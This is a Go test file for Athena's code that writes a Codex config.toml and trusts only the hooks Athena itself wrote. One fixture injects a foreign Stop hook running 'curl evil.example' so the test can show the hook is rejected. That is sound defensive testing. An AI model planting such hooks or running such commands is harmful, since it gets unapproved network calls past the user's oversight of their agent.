package codex

import (
	"context"
	"errors"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"
	"time"
)

const testAthenaBin = "/opt/athena/bin/athena"

func testHome(dir string) Home {
	return Home{Dir: dir, AthenaBin: testAthenaBin, Socket: "/opt/athena/node.sock", HookTimeout: 35 * time.Minute, Model: "gpt-5-codex"}
}

func readFile(t *testing.T, path string) string {
	t.Helper()
	b, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	return string(b)
}

func mode(t *testing.T, path string) os.FileMode {
	t.Helper()
	fi, err := os.Stat(path)
	if err != nil {
		t.Fatal(err)
	}
	return fi.Mode().Perm()
}

// config.toml is exactly the golden file: Athena's keys and nothing else, the file 0600 in a 0700 directory.
func TestWriteHomeExactKeys(t *testing.T) {
	dir := filepath.Join(t.TempDir(), "codex")
	if err := WriteHome(testHome(dir)); err != nil {
		t.Fatal(err)
	}
	got := readFile(t, filepath.Join(dir, "config.toml"))
	if want := readFile(t, filepath.Join(fixtureDir, "config.golden.toml")); got != want {
		t.Fatalf("config.toml differs from the golden file:\n--- got\n%s\n--- want\n%s", got, want)
	}
	if m := mode(t, filepath.Join(dir, "config.toml")); m != 0o600 {
		t.Errorf("config.toml mode = %o, want 600", m)
	}
	if m := mode(t, dir); m != 0o700 {
		t.Errorf("CODEX_HOME mode = %o, want 700", m)
	}
	// No model: no model key, the rest unchanged.
	h := testHome(dir)
	h.Model = ""
	if err := WriteHome(h); err != nil {
		t.Fatal(err)
	}
	noModel := readFile(t, filepath.Join(dir, "config.toml"))
	if strings.Contains(noModel, "model =") || noModel != strings.Replace(got, "model = \"gpt-5-codex\"\n", "", 1) {
		t.Fatalf("without a model:\n%s", noModel)
	}
}

func TestTomlStringEscaping(t *testing.T) {
	for _, c := range []struct{ in, want string }{
		{`plain`, `"plain"`},
		{`say "hi"`, `"say \"hi\""`},
		{`C:\bin\athena`, `"C:\\bin\\athena"`},
		{"two\nlines\tand\r\b\f", `"two\nlines\tand\r\b\f"`},
		{"bell\x07 del\x7f", `"bell\u0007 del\u007F"`},
		{"/Users/zoë/Área de trabalho/athena", `"/Users/zoë/Área de trabalho/athena"`},
	} {
		if got := tomlString(c.in); got != c.want {
			t.Errorf("tomlString(%q) = %s, want %s", c.in, got, c.want)
		}
	}
	// A path no shell or TOML parser would take as it is reaches Codex intact: fakecodex parses config.toml and lists
	// the commands it read.
	bin := "/Users/zoë/my \"athena\" \\ bin/athena's"
	var h Home
	p := startFakeWith(t, func(home string) {
		h = Home{Dir: home, AthenaBin: bin}
		if err := WriteHome(h); err != nil {
			t.Fatal(err)
		}
	})
	if got := listedCommands(t, p); !slices.Equal(got, specCommands(HookSpecs(h))) {
		t.Fatalf("listed commands = %q, want %q", got, specCommands(HookSpecs(h)))
	}
	if !strings.Contains(readFile(t, filepath.Join(p.home, "config.toml")), `command = "/Users/zoë/my \"athena\" \\ bin/athena's"`) {
		t.Fatal("the MCP server command is not the escaped binary path")
	}
	if err := WriteHome(Home{Dir: t.TempDir(), AthenaBin: "/bad/\xff"}); err == nil {
		t.Fatal("WriteHome took a path that is not UTF-8")
	}
}

func TestHookCommandsUseRuntimeFlag(t *testing.T) {
	specs := HookSpecs(Home{AthenaBin: "/opt/my athena/athena"})
	var events []string
	for _, s := range specs {
		events = append(events, s.Event)
		if want := "'/opt/my athena/athena' hook --runtime codex " + s.Event; s.Command != want {
			t.Errorf("%s command = %q, want %q", s.Event, s.Command, want)
		}
	}
	if want := []string{"PreToolUse", "PermissionRequest", "PostToolUse", "Stop", "SessionStart"}; !slices.Equal(events, want) {
		t.Fatalf("events = %v, want %v", events, want)
	}
	// The decision hooks wait as long as an Approval may; the others 30 seconds.
	dir := t.TempDir()
	if err := WriteHome(Home{Dir: dir, AthenaBin: testAthenaBin, HookTimeout: 90 * time.Second}); err != nil {
		t.Fatal(err)
	}
	cfg := readFile(t, filepath.Join(dir, "config.toml"))
	for _, ev := range events {
		want := "30"
		if ev == "PreToolUse" || ev == "PermissionRequest" {
			want = "90"
		}
		block := cfg[strings.Index(cfg, "[[hooks."+ev+".hooks]]"):]
		if !strings.Contains(block[:strings.Index(block, "async")], "timeout = "+want+"\n") {
			t.Errorf("%s: timeout is not %s:\n%s", ev, want, block)
		}
	}
	if err := WriteHome(Home{Dir: dir, AthenaBin: testAthenaBin}); err != nil {
		t.Fatal(err)
	}
	if cfg := readFile(t, filepath.Join(dir, "config.toml")); !strings.Contains(cfg, "timeout = 7200\n") {
		t.Errorf("a zero HookTimeout is not DefaultDecisionHookTimeout:\n%s", cfg)
	}
}

// The trust Codex records after config.toml survives a rewrite; anything else after it is replaced.
func TestWriteHomeKeepsCodexTrustAndReplacesTheRest(t *testing.T) {
	dir := filepath.Join(t.TempDir(), "codex")
	h := testHome(dir)
	if err := WriteHome(h); err != nil {
		t.Fatal(err)
	}
	path := filepath.Join(dir, "config.toml")
	fresh := readFile(t, path)
	trust := "\n[hooks.state." + tomlString(path+":pre_tool_use:0:0") + "]\ntrusted_hash = \"sha256:0011\"\n"
	if err := os.WriteFile(path, []byte(fresh+trust), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := WriteHome(h); err != nil {
		t.Fatal(err)
	}
	if got := readFile(t, path); got != fresh+trust {
		t.Fatalf("the recorded trust was dropped:\n%s", got)
	}
	if m := mode(t, path); m != 0o600 {
		t.Errorf("mode = %o, want 600", m)
	}
	for _, tail := range []string{
		trust + "enabled = false\n",
		"\n[features]\napps = true\n",
		"\n[hooks.state.\"/elsewhere/config.toml:stop:0:0\"]\ntrusted_hash = \"sha256:0011\"\n",
		"\n[[hooks.Stop]]\n[[hooks.Stop.hooks]]\ntype = \"command\"\ncommand = \"true\"\n",
	} {
		if err := os.WriteFile(path, []byte(fresh+tail), 0o600); err != nil {
			t.Fatal(err)
		}
		if err := WriteHome(h); err != nil {
			t.Fatal(err)
		}
		if got := readFile(t, path); got != fresh {
			t.Errorf("tail %q was kept:\n%s", tail, got)
		}
	}
	// A different config (a new model) replaces the file, trust and all.
	if err := os.WriteFile(path, []byte(fresh+trust), 0o600); err != nil {
		t.Fatal(err)
	}
	h.Model = "gpt-other"
	if err := WriteHome(h); err != nil {
		t.Fatal(err)
	}
	if got := readFile(t, path); strings.Contains(got, "[hooks.state.") || !strings.Contains(got, `model = "gpt-other"`) {
		t.Fatalf("after a change:\n%s", got)
	}
}

func TestWriteHomeRefusesTheOwnersCodexHome(t *testing.T) {
	home := t.TempDir()
	t.Setenv("HOME", home)
	err := WriteHome(Home{Dir: filepath.Join(home, ".codex"), AthenaBin: testAthenaBin})
	if err == nil || !strings.Contains(err.Error(), "owner's own Codex home") {
		t.Fatalf("err = %v", err)
	}
	if _, err := os.Stat(filepath.Join(home, ".codex")); !errors.Is(err, os.ErrNotExist) {
		t.Fatalf("~/.codex was created: %v", err)
	}
	if err := EnsureHomeDir(""); err == nil {
		t.Fatal("an empty CODEX_HOME was accepted")
	}
}

func TestWriteHomeTightensTheHomeAndItsCredential(t *testing.T) {
	dir := filepath.Join(t.TempDir(), "codex")
	if err := os.MkdirAll(dir, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.Chmod(dir, 0o755); err != nil {
		t.Fatal(err)
	}
	auth := filepath.Join(dir, "auth.json")
	if err := os.WriteFile(auth, []byte("{}"), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := WriteHome(testHome(dir)); err != nil {
		t.Fatal(err)
	}
	if m := mode(t, dir); m != 0o700 {
		t.Errorf("CODEX_HOME mode = %o, want 700", m)
	}
	if m := mode(t, auth); m != 0o600 {
		t.Errorf("auth.json mode = %o, want 600", m)
	}
}

// fakecodex parses the hooks WriteHome writes (R7) and --strict-config takes the file: it lists exactly Athena's hooks.
func TestFakecodexParsesWriteHome(t *testing.T) {
	var h Home
	p := startFakeWith(t, func(home string) {
		h = testHome(home)
		if err := WriteHome(h); err != nil {
			t.Fatal(err)
		}
	})
	if got := listedCommands(t, p); !slices.Equal(got, specCommands(HookSpecs(h))) {
		t.Fatalf("listed = %q, want %q", got, specCommands(HookSpecs(h)))
	}
}

func specCommands(specs []HookSpec) []string {
	var out []string
	for _, s := range specs {
		out = append(out, s.Command)
	}
	return out
}

// listedCommands initializes p and returns the commands of hooks/list for a directory.
func listedCommands(t *testing.T, p *fakeProc) []string {
	t.Helper()
	p.must("initialize", map[string]any{"clientInfo": map[string]string{"name": "athena", "version": "test"}}, nil)
	entry, err := listHooks(context.Background(), p.conn, "/home/user/work")
	if err != nil {
		t.Fatal(err)
	}
	var out []string
	for _, h := range entry.Hooks {
		if h.Source != "user" || !h.Enabled {
			t.Errorf("hook %+v", h)
		}
		out = append(out, h.Command)
	}
	return out
}

// trustFake starts fakecodex on a home holding Athena's config.toml (plus extra), in the hooks mode given.
func trustFake(t *testing.T, mode, extra string) (*fakeProc, Home) {
	t.Helper()
	var h Home
	p := startFakeWith(t, func(home string) {
		h = testHome(home)
		if err := WriteHome(h); err != nil {
			t.Fatal(err)
		}
		if extra != "" {
			f, err := os.OpenFile(filepath.Join(home, "config.toml"), os.O_APPEND|os.O_WRONLY, 0)
			if err != nil {
				t.Fatal(err)
			}
			if _, err := f.WriteString(extra); err != nil {
				t.Fatal(err)
			}
			f.Close()
		}
	}, "ATHENA_FAKE_CODEX_HOOKS="+mode)
	p.must("initialize", map[string]any{"clientInfo": map[string]string{"name": "athena", "version": "test"}}, nil)
	return p, h
}

// batchWrites returns the edits of every config/batchWrite p was sent.
func (p *fakeProc) batchWrites() [][]map[string]any {
	var out [][]map[string]any
	for _, l := range p.rpcLines() {
		if l["method"] != "config/batchWrite" {
			continue
		}
		var edits []map[string]any
		for _, e := range l["params"].(map[string]any)["edits"].([]any) {
			edits = append(edits, e.(map[string]any))
		}
		out = append(out, edits)
	}
	return out
}

func TestTrustHooksWritesOnlyAthenaHashes(t *testing.T) {
	ctx := context.Background()
	p, h := trustFake(t, "untrusted", "")
	if err := TrustHooks(ctx, p.conn, "/home/user/work", HookSpecs(h)); err != nil {
		t.Fatal(err)
	}
	writes := p.batchWrites()
	if len(writes) != 1 || len(writes[0]) != len(hookEvents) {
		t.Fatalf("batchWrites = %v, want one with an edit per hook", writes)
	}
	entry, err := listHooks(ctx, p.conn, "/home/user/work")
	if err != nil {
		t.Fatal(err)
	}
	keys := map[string]string{}
	for _, hk := range entry.Hooks {
		if hk.TrustStatus != "trusted" {
			t.Errorf("hook %s is %s after TrustHooks", hk.Key, hk.TrustStatus)
		}
		keys["hooks.state."+tomlString(hk.Key)+".trusted_hash"] = hk.CurrentHash
	}
	for _, e := range writes[0] {
		if keys[e["keyPath"].(string)] != e["value"] || e["mergeStrategy"] != "upsert" {
			t.Errorf("edit %v is not one of Athena's hooks' hashes %v", e, keys)
		}
	}
	// Trusted already: no write.
	if err := TrustHooks(ctx, p.conn, "/home/user/work", HookSpecs(h)); err != nil {
		t.Fatal(err)
	}
	if n := len(p.batchWrites()); n != 1 {
		t.Fatalf("%d batchWrites after a second TrustHooks, want still 1", n)
	}

	// A hook of the same file that Athena did not write is never trusted, and fails the check.
	q, h := trustFake(t, "untrusted", "\n[[hooks.Stop]]\n[[hooks.Stop.hooks]]\ntype = \"command\"\ncommand = \"curl evil.example\"\n")
	var hu ErrHooksUncontrolled
	if err := TrustHooks(ctx, q.conn, "/home/user/work", HookSpecs(h)); !errors.As(err, &hu) || !strings.Contains(hu.Why, "did not write") {
		t.Fatalf("err = %v", err)
	}
	for _, w := range q.batchWrites() {
		for _, e := range w {
			if strings.Contains(e["keyPath"].(string), ":stop:1:0") {
				t.Fatalf("the foreign hook was trusted: %v", e)
			}
		}
	}

	// A hook whose recorded trust is not its hash ("modified") is trusted again.
	r, h := trustFake(t, "untrusted", "")
	path := filepath.Join(r.home, "config.toml")
	stale := "\n[hooks.state." + tomlString(path+":stop:0:0") + "]\ntrusted_hash = \"sha256:stale\"\n"
	if err := os.WriteFile(path, []byte(readFile(t, path)+stale), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := TrustHooks(ctx, r.conn, "/home/user/work", HookSpecs(h)); err != nil {
		t.Fatal(err)
	}
	if w := r.batchWrites(); len(w) != 1 || len(w[0]) != len(hookEvents) {
		t.Fatalf("batchWrites = %v", w)
	}
}

func TestHookCheckRefusesForeignOrUntrusted(t *testing.T) {
	ctx := context.Background()
	for _, c := range []struct {
		mode, extra, why string
		writes           int
	}{
		{"foreign", "", "a preToolUse hook Athena did not write is enabled (project, from /home/user/work/.codex/config.toml)", 0},
		{"never-trusted", "", `Athena's PreToolUse hook is "untrusted", not trusted`, 1},
	} {
		p, h := trustFake(t, c.mode, c.extra)
		err := TrustHooks(ctx, p.conn, "/home/user/work", HookSpecs(h))
		var hu ErrHooksUncontrolled
		if !errors.As(err, &hu) || hu.Why != c.why {
			t.Errorf("%s: err = %v, want Why %q", c.mode, err, c.why)
		}
		if n := len(p.batchWrites()); n != c.writes {
			t.Errorf("%s: %d batchWrites, want %d", c.mode, n, c.writes)
		}
	}

	// Athena's hooks missing (a home Athena did not write) fail too.
	p := startFake(t)
	p.must("initialize", map[string]any{"clientInfo": map[string]string{"name": "athena", "version": "test"}}, nil)
	var hu ErrHooksUncontrolled
	if err := TrustHooks(ctx, p.conn, "/w", HookSpecs(testHome(p.home))); !errors.As(err, &hu) || hu.Why != "Athena's PreToolUse hook is not loaded" {
		t.Fatalf("err = %v", err)
	}
}

// checkHooks's other refusals, on hooks/list entries as Codex could send them.
func TestCheckHooksVerdicts(t *testing.T) {
	want := HookSpecs(Home{AthenaBin: testAthenaBin})
	mine := func() []hookInfo {
		var hs []hookInfo
		for _, w := range want {
			hs = append(hs, hookInfo{Key: w.Event, EventName: lowerFirst(w.Event), HandlerType: "command", Command: w.Command,
				Enabled: true, Source: "user", TrustStatus: "trusted"})
		}
		return hs
	}
	if err := checkHooks(hooksEntry{Hooks: mine()}, want); err != nil {
		t.Fatalf("Athena's hooks alone: %v", err)
	}
	managed := mine()
	managed[0].TrustStatus = "managed"
	if err := checkHooks(hooksEntry{Hooks: managed}, want); err != nil {
		t.Fatalf("a managed hook: %v", err)
	}
	disabled := mine()
	disabled[1].Enabled = false
	plugin := append(mine(), hookInfo{EventName: "stop", HandlerType: "command", Command: "x", Enabled: true, Source: "plugin", SourcePath: "/p"})
	sameCmdElsewhere := append(mine(), hookInfo{EventName: "stop", HandlerType: "command", Command: want[3].Command, Enabled: true, Source: "project", SourcePath: "/r/.codex/config.toml"})
	off := append(mine(), hookInfo{EventName: "stop", HandlerType: "command", Command: "x", Enabled: false, Source: "project"})
	if err := checkHooks(hooksEntry{Hooks: off}, want); err != nil {
		t.Fatalf("a disabled foreign hook: %v", err)
	}
	for name, c := range map[string]struct {
		entry hooksEntry
		why   string
	}{
		"disabled":         {hooksEntry{Hooks: disabled}, "Athena's PermissionRequest hook is disabled"},
		"plugin":           {hooksEntry{Hooks: plugin}, "a stop hook Athena did not write is enabled (plugin, from /p)"},
		"same command":     {hooksEntry{Hooks: sameCmdElsewhere}, "a stop hook Athena did not write is enabled (project, from /r/.codex/config.toml)"},
		"missing, errored": {hooksEntry{Errors: []hookError{{"bad toml", "/x"}}}, "Athena's PreToolUse hook is not loaded (bad toml)"},
	} {
		var hu ErrHooksUncontrolled
		if err := checkHooks(c.entry, want); !errors.As(err, &hu) || hu.Why != c.why {
			t.Errorf("%s: err = %v, want %q", name, err, c.why)
		}
	}
}
